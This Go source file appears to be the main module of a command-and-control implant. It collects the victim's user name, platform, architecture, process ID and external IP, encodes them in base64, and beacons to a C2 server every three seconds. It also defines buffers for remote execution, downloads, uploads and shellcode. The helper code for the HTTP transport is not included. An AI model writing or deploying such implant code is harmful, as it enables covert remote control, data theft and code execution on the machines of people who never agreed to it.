package main

import (
	"os"
	"fmt"
	"time"
	"strconv"
	"context"
	"runtime"
	"os/user"
	"net/http"
	"encoding/json"
	ps "github.com/mitchellh/go-ps"
	"github.com/thecodeteam/goodbye"
)

type Beacon struct {
	Ip string
	Id string
	ProxyClients []Beacon
	ExecBuffer []string
	DownloadBuffer []string
	UploadBuffer []string
	ShellcodeBuffer []string
	LastSeen time.Time 	
}

var msPerUpdate int = 3000
var cmdProxyIp string
var cmdProxyId string
var cmdAddress string
var cmdPort string
var cmdHost string
var id string
var ip string
var pid string
var pname string
var queryData string
var debug bool = false
var curUser string
var platform string
var arch string
var netClient = &http.Client{
	Timeout: time.Second * 10,
}

func queryC2Server(handler Request) {
	handler.queryServer()
}

func main() {
	user, _ := user.Current()
	curUser = user.Username
	platform = runtime.GOOS
	arch = runtime.GOARCH
	pid = strconv.Itoa(os.Getpid())
	p, e := ps.FindProcess(os.Getpid())

	fmt.Println(id + " " + platform + "/" + arch)
	fmt.Println(pid + " : " + p.Executable())
	fmt.Println(e)
	
	lhost, err := externalIP()
	debugFatal(err)
	ip = lhost
	jsonData, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,p.Executable(),"",nil})
	debugFatal(err)
	
	var encoder = Base64Encoder {
		data: jsonData,
	}

	/*var ipidEncoder = IPIDEncoder {
		data: jsonData,
	}

	var ipidUpdateRequest = BeaconIPID {
		data: ipidEncoder.scramble(),
	}

	ipidUpdateRequest.queryServer()*/

	var serverUpdateRequest = BeaconHttp {
		method: "GET",
		data: encoder.scramble(),
	}

	ctx := context.Background()
	defer goodbye.Exit(ctx, -1)
	goodbye.Notify(ctx)
	goodbye.Register(func(ctx context.Context, sig os.Signal) {
		serverUpdateRequest.exitHandler()
	})

	for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
		go func() {
			queryC2Server(serverUpdateRequest)
		}()
	}
}